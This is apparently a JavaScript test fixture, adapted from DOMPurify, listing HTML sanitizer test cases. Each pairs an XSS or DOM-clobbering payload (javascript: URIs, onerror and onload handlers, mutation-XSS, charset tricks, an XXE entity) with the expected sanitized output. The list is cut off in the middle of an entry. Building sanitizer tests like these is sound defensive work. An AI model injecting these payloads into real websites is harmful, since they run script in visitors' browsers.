// Taken and adapted from https://github.com/cure53/DOMPurify/blob/main/test/fixtures/expect.js
export default [
	{
		title: 'safe usage of URI-like attribute values (see #135)',
		payload: '<b href="javascript:alert(1)" title="javascript:alert(2)"></b>',
		expected: '<b></b>',
	},
	{
		title: 'DOM Clobbering against document.createElement() (see #47)',
		payload: '<img src=x name=createElement><img src=y id=createElement>',
		expected: '<img><img>',
	},
	{
		title: 'DOM Clobbering against an empty cookie',
		payload: '<img src=x name=cookie>',
		expected: '<img>',
	},
	{
		title: 'JavaScript URIs using Unicode LS/PS I',
		payload: "123<a href='\u2028javascript:alert(1)'>I am a dolphin!</a>",
		expected: '123<a>I am a dolphin!</a>',
	},
	{
		title: 'JavaScript URIs using Unicode LS/PS II',
		payload: "123<a href='\u2028javascript:alert(1)'>I am a dolphin too!</a>",
		expected: '123<a>I am a dolphin too!</a>',
	},
	{
		title: 'JavaScript URIs using Unicode Whitespace',
		payload:
			"123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>",
		expected:
			'123<a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a><a>CLICK</a>',
	},
	{
		title: 'Image with data URI src',
		payload: '<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>',
		expected: '<img>',
	},
	{
		title: 'Image with data URI src with whitespace',
		payload: '<img src="\r\ndata:image/jpeg,ab798ewqxbaudbuoibeqbla">',
		expected: '<img>',
	},
	{
		title: 'Image with JavaScript URI src (DoS on Firefox)',
		payload: "<img src='javascript:while(1){}'>",
		expected: '<img>',
	},
	{
		title: 'Link with data URI href',
		payload: '<a href=data:,evilnastystuff>clickme</a>',
		expected: '<a>clickme</a>',
	},
	{
		title: 'Simple numbers',
		payload: '123456',
		expected: '123456',
	},
	{
		title: 'DOM clobbering XSS by @irsdl using attributes',
		payload: '<form onmouseover=\'alert(1)\'><input name="attributes"><input name="attributes">',
		expected: '',
	},
	{
		title: 'DOM clobbering: getElementById',
		payload: '<img src=x name=getElementById>',
		expected: '<img>',
	},
	{
		title: 'DOM clobbering: location',
		payload: '<a href="#some-code-here" id="location">invisible',
		expected: '<a>invisible</a>',
	},
	{
		title: 'onclick, onsubmit, onfocus; DOM clobbering: parentNode',
		payload:
			'<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>',
		expected: '<div>123</div>',
	},
	{
		title: 'onsubmit, onfocus; DOM clobbering: nodeName',
		payload: '<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>',
		expected: '123',
	},
	{
		title: 'onsubmit, onfocus; DOM clobbering: nodeType',
		payload: '<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>',
		expected: '123',
	},
	{
		title: 'onsubmit, onfocus; DOM clobbering: children',
		payload: '<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>',
		expected: '123',
	},
	{
		title: 'onsubmit, onfocus; DOM clobbering: attributes',
		payload: '<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>',
		expected: '123',
	},
	{
		title: 'onsubmit, onfocus; DOM clobbering: removeChild',
		payload: '<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>',
		expected: '123',
	},
	{
		title: 'onsubmit, onfocus; DOM clobbering: removeAttributeNode',
		payload: '<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>',
		expected: '123',
	},
	{
		title: 'onsubmit, onfocus; DOM clobbering: setAttribute',
		payload: '<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>',
		expected: '123',
	},
	{
		title: '&gt;style&lt;',
		payload: '<style>*{color: red}</style>',
		expected: '',
	},
	{
		title: 'HTML paragraph with text',
		payload: '<p>hello</p>',
		expected: '<p>hello</p>',
	},
	{
		title: 'mXSS Variation I',
		payload: '<listing>&lt;img onerror="alert(1);//" src=x&gt;<t t></listing>',
		expected: '&lt;img onerror="alert(1);//" src=x&gt;',
	},
	{
		title: 'mXSS Variation II',
		payload: "<img src=x id/=' onerror=alert(1)//'>",
		expected: '<img>',
	},
	{
		title: 'Textarea and comments enabling img element',
		payload: '<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->',
		expected: '@shafigullin',
	},
	{
		title: 'Img element inside noscript terminated inside comment',
		payload: '<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>',
		expected: '<b></b>',
	},
	{
		title: 'Img element inside noscript terminated inside attribute',
		payload: '<b><noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>',
		expected: '<b><a></a></b>',
	},
	{
		title: 'Img element inside shadow DOM template',
		payload:
			'<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>',
		expected: '',
	},
	{
		title: 'Low-range-ASCII obfuscated JavaScript URI',
		payload: '<a href="\u0001java\u0003script:alert(1)">@shafigullin<a>',
		expected: '<a>@shafigullin</a><a></a>',
	},
	{
		title: 'Img inside style inside broken option element',
		payload:
			'\u0001<option><style></option></select><b><img src=x onerror=alert(1)></style></option>',
		expected: '\u0001&lt;/option&gt;&lt;/select&gt;&lt;b&gt;&lt;img src=x onerror=alert(1)&gt;',
	},
	{
		title: 'Iframe inside option element',
		payload: '<option><iframe></select><b><script>alert(1)</script>',
		expected: '&lt;/select&gt;&lt;b&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
	},
	{
		title: 'Closing Iframe and option',
		payload: '</iframe></option>',
		expected: '',
	},
	{
		title: 'Image after style to trick jQuery tag-completion',
		payload: '<b><style><style/><img src=x onerror=alert(1)>',
		expected: '<b>&lt;style/&gt;&lt;img src=x onerror=alert(1)&gt;</b>',
	},
	{
		title: 'Image after self-closing style to trick jQuery tag-completion',
		payload: '<b><style><style////><img src=x onerror=alert(1)></style>',
		expected: '<b>&lt;style////&gt;&lt;img src=x onerror=alert(1)&gt;</b>',
	},
	{
		title: 'MathML example',
		payload:
			'<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow><menclose notation="box"><mi>a</mi></menclose><mo>,</mo>',
		expected: 'a,',
	},
	{
		title: 'DOM clobbering attack using name=body',
		payload:
			'<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>',
		expected: '<img><img>@mmrupp<img>',
	},
	{
		title: 'Special esacpes in protocol handler for XSS in Blink',
		payload: '<a href="\u0001java\u0003script:alert(1)">@shafigullin<a>',
		expected: '<a>@shafigullin</a><a></a>',
	},
	{
		title: 'DOM clobbering attack using activeElement',
		payload: '<image name=activeElement><svg onload=alert(1)>',
		expected: '<img>',
	},
	{
		title: 'DOM clobbering attack using name=body and injecting SVG + keygen',
		payload:
			'<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>',
		expected: '<img><img>, ',
	},
	{
		title: 'Bypass using multiple unknown attributes',
		payload: '<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>',
		expected: '<div>@superevr</div>',
	},
	{
		title: 'Bypass using event handlers and unknown attributes',
		payload:
			'<button remove=me onmousedown="javascript:alert(1);" onclick="javascript:alert(1)" >@giutro',
		expected: '@giutro',
	},
	{
		title: 'Bypass using DOM bugs when dealing with JS URIs in arbitrary attributes',
		payload: '<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>',
		expected: '<a>CLICK ME (bypass by @shafigullin)</a>',
	},
	{
		title: 'Bypass using DOM bugs when dealing with JS URIs in arbitrary attributes (II)',
		payload:
			'<isindex x="javascript:" onmouseover="alert(1)" label="variation of bypass by @giutro">',
		expected: '',
	},
	{
		title: 'Bypass using unknown attributes III',
		payload: '<div wow=removeme onmouseover=alert(1)>text',
		expected: '<div>text</div>',
	},
	{
		title: 'Bypass using unknown attributes IV',
		payload: '<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>',
		expected: '',
	},
	{
		title: 'Bypass using unknown attributes V',
		payload: '<isindex src="javascript:" onmouseover="alert(1)" label="bypass by @giutro" />',
		expected: '',
	},
	{
		title: 'Bypass using JS URI in href',
		payload: '<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>',
		expected: '<a>CLICK ME (bypass by @shafigullin)</a>',
	},
	{
		payload: '<form action="javasc\nript:alert(1)"><button>XXX</button></form>',
		expected: 'XXX',
	},
	{
		payload:
			'<div id="1"><form id="foobar"></form><button form="foobar" formaction="javascript:alert(1)">X</button>//["\'`-->]]>]</div>',
		expected: '<div>X//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["\'`-->]]>]</div>',
		expected:
			'<div>&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["\'`-->]]>]</div>',
		expected:
			'<div>&amp;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))//["\'`-->]]>]</div>',
		expected:
			'<div>0?Worker("#").onmessage=function(_)eval(_.data) :postMessage(importScripts(\'data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk\'))//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			"<div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div>",
		expected:
			"<div>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload:
			'<div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["\'`-->]]>]</div>',
		expected: '<div>({set/**/$($){_/**/setter=$,_=1}}).$=alert//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="7"><input onfocus=alert(7) autofocus>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="8"><input onblur=alert(8) autofocus><input autofocus>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="9"><a style="-o-link:\'javascript:alert(9)\';-o-link-source:current">X</a>//["\'`-->]]>]</div>\n\n<div id="10"><video poster=javascript:alert(10)//></video>//["\'`-->]]>]</div>',
		expected: '<div><a>X</a>//["\'`--&gt;]]&gt;]</div>\n\n<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["\'`-->]]>]</div>',
		expected: '<div>...//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["\'`-->]]>]</div>',
		expected: '<div>01//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["\'`-->]]>]</div>',
		expected: '<div>({0:#0=alert/#0#/#0#(0)})//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="16">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//["\'`-->]]>]</div>',
		expected: '<div>X//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="18"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>//["\'`-->]]>]</div>',
		expected: '<div>alert(1)//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="19"><meta charset="x-mac-farsi">\u00BCscript \u00BEalert(19)//\u00BC/script \u00BE//["\'`-->]]>]</div>',
		expected: '<div>\u00BCscript \u00BEalert(19)//\u00BC/script \u00BE//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="20"><script>ReferenceError.prototype.__defineGetter__(\'name\', function(){alert(20)}),x</script>//["\'`-->]]>]</div>',
		expected:
			"<div>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload:
			'<div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'alert(21)\')()</script>//["\'`-->]]>]</div>',
		expected:
			"<div>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload: '<div id="22"><input onblur=focus() autofocus><input>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="23"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["\'`-->]]>]</div>',
		expected: '<div>X//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="24">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`behAvior:url(#default#time2)` attributename=`innerhtml` to=`<img/src="x"onerror=alert(24)>`>//["\'`-->]]>]</div>',
		expected: '<div>1`&gt;//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="25"><script src="#">{alert(25)}</script>;1//["\'`-->]]>]</div>',
		expected: '<div>{alert(25)};1//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["\'`-->]]>]</div>',
		expected:
			'<div>+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="27"><style>p[foo=bar{}*{-o-link:\'javascript:alert(27)\'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["\'`-->]]>]</div><div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(28)>>//["\'`-->]]>]</div>',
		expected:
			"<div>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};//[\"'`--&gt;]]&gt;]</div><div>1&gt;//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload:
			'<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["\'`-->]]>]</div>',
		expected: '<div>]]&gt;]</div>',
	},
	{
		payload:
			'<div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["\'`-->]]>]</div>',
		expected: '<div>@import "data:,*%7bx:expression(alert(30))%7D";//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="31"><frameset onload=alert(31)>//["\'`-->]]>]</div>',
		expected: '',
	},
	{
		payload: '<div id="32"><table background="javascript:alert(32)"></table>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["\'`-->]]>]</div>',
		expected: '<div><a></a><a>XXX</a><a>XXX</a>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["\'`-->]]>]</div>',
		expected: '<div>1//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["\'`-->]]>]</div>',
		expected: '<div>1<a></a>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["\'`-->]]>]</div>',
		expected: '<div><a>XXX</a>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["\'`-->]]>]</div>',
		expected: '<div><img>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["\'`-->]]>]</div><div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->',
		expected: '<div><img>//["\'`--&gt;]]&gt;]</div><div></div>',
	},
	{
		payload: '<![><img src="]><img src=x onerror=alert(39)//">',
		expected: '<img>',
	},
	{
		payload:
			'<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->\n<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(2)//"></svg>//["\'`-->]]>]</div>',
		expected: '&gt;&lt;image xlink:href="<img>//["\'`--&gt;]]&gt;]',
	},
	{
		payload:
			'<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["\'`-->]]>]</div>',
		expected: '<div>&lt;img src="<img>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="41"><li style=list-style:url() onerror=alert(41)></li>',
		expected: '<div><li></li></div>',
	},
	{
		payload:
			'<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["\'`-->]]>]</div>',
		expected: '<div></div>//["\'`--&gt;]]&gt;]',
	},
	{
		payload:
			'<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["\'`-->]]>]</div>',
		expected: '<div><a>XXX</a>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="43"><?xml version="1.0" standalone="no"?>',
		expected: '<div></div>',
	},
	{
		payload:
			'<html xmlns="http://www.w3.org/1999/xhtml">\n<head>\n<style type="text/css">\n@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}\n</style>\n</head>\n<body>Hello</body>\n</html>//["\'`-->]]>]</div>',
		expected: 'Hello\n//["\'`--&gt;]]&gt;]',
	},
	{
		payload:
			'<div id="44"><style>*[{}@import\'test.css?]{color: green;}</style>X//["\'`-->]]>]</div>',
		expected: "<div>*[{}@import'test.css?]{color: green;}X//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload:
			'<div id="45"><div style="font-family:\'foo[a];color:red;\';">XXX</div>//["\'`-->]]>]</div>',
		expected: '<div><div>XXX</div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="46"><div style="font-family:foo}color=red;">XXX</div>//["\'`-->]]>]</div>',
		expected: '<div><div>XXX</div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["\'`-->]]>]</div>',
		expected: '<div>alert(47)//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["\'`-->]]>]</div>',
		expected: '<div>alert(48)//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="52"><x style="behavior:url(test.sct)">//["\'`-->]]>]</div><div id="53"><xml id="xss" src="test.htc"></xml>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div><div></div>',
	},
	{
		payload:
			'<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["\'`-->]]>]</div>',
		expected: '//["\'`--&gt;]]&gt;]',
	},
	{
		payload:
			"<div id=\"54\"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//[\"'`-->]]>]</div>",
		expected:
			"<div>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]//[\"'`--&gt;]]&gt;]</div>",
	},
	{
		payload: '<div id="55"><video><source onerror="alert(55)">//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="56"><video onerror="alert(56)"><source></source></video>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="57"><b <script>alert(57)//</script>0</script></b>//["\'`-->]]>]</div>',
		expected: '<div><b>alert(57)//0</b>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="58"><b><script<b></b><alert(58)</script </b></b>//["\'`-->]]>]</div>',
		expected: '<div><b></b>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="59"><div id="div1"><input value="``onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["\'`-->]]>]</div>',
		expected:
			'<div><div></div> <div></div>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["\'`-->]]>]</div>',
		expected: '<div><div>XXX</div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			"<div id=\"62\"><!-- IE 6-8 -->\n<x '=\"foo\"><x foo='><img src=x onerror=alert(62)//'>\n<!-- IE 6-9 -->\n<! '=\"foo\"><x foo='><img src=x onerror=alert(2)//'>\n<? '=\"foo\"><x foo='><img src=x onerror=alert(3)//'>//[\"'`-->]]>]</div>",
		expected: '<div>\n\n\n\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10\u2193, OM10.0\u2193, GC6\u2193, FF\n<img src="javascript:alert(2)">\n<image src="javascript:alert(2)"> // IE6, O10.10\u2193, OM10.0\u2193\n<script src="javascript:alert(3)"></script> // IE6, O11.01\u2193, OM10.1\u2193//["\'`-->]]>]</div>',
		expected:
			'<div> // O10.10\u2193, OM10.0\u2193, GC6\u2193, FF\n<img>\n<img> // IE6, O10.10\u2193, OM10.0\u2193\n // IE6, O11.01\u2193, OM10.1\u2193//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["\'`-->]]>]</div>',
		expected: '<div>]&gt;&amp;x;//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["\'`-->]]>]</div><div id="66"><?xml version="1.0"?>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div><div></div>',
	},
	{
		payload:
			'<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>\n<root/>//["\'`-->]]>]</div>\n<div id="67"><!DOCTYPE x [\n    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"\n onerror CDATA "alert(67)"\n onload CDATA "alert(2)">\n]><img />//["\'`-->]]>]</div>',
		expected: '//["\'`--&gt;]]&gt;]\n<div>\n]&gt;<img>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">\n    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>\n</doc>//["\'`-->]]>]</div>',
		expected: '<div>\n    XXX\n//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="69"><card xmlns="http://www.wapforum.org/2001/wml"><onevent type="ontimer"><go href="javascript:alert(69)"/></onevent><timer value="1"/></card>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="70"><div style=width:1px;filter:glow onfilterchange=alert(70)>x</div>//["\'`-->]]>]</div>',
		expected: '<div><div>x</div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="71"><// style=x:expression\u00028alert(71)\u00029>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="72"><form><button formaction="javascript:alert(72)">X</button>//["\'`-->]]>]</div>',
		expected: '<div>X//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="73"><event-source src="event.php" onload="alert(73)">//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="74"><a href="javascript:alert(74)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>//["\'`-->]]>]</div>',
		expected: '<div><a></a>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload: '<div id="75"><script<{alert(75)}/></script </>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="76"><?xml-stylesheet type="text/css"?><!DOCTYPE x SYSTEM "test.dtd"><x>&x;</x>//["\'`-->]]>]</div>',
		expected: '<div>&amp;x;//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="77"><?xml-stylesheet type="text/css"?><root style="x:expression(alert(77))"/>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="78"><?xml-stylesheet type="text/xsl" href="#"?><img xmlns="x-schema:test.xdr"/>//["\'`-->]]>]</div>',
		expected: '<div><img>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="79"><object allowscriptaccess="always" data="x"></object>//["\'`-->]]>]</div>',
		expected: '<div>//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
			'<div id="80"><style>*{x:\uFF45\uFF58\uFF50\uFF52\uFF45\uFF53\uFF53\uFF49\uFF4F\uFF4E(alert(80))}</style>//["\'`-->]]>]</div>',
		expected:
			'<div>*{x:\uFF45\uFF58\uFF50\uFF52\uFF45\uFF53\uFF53\uFF49\uFF4F\uFF4E(alert(80))}//["\'`--&gt;]]&gt;]</div>',
	},
	{
		payload:
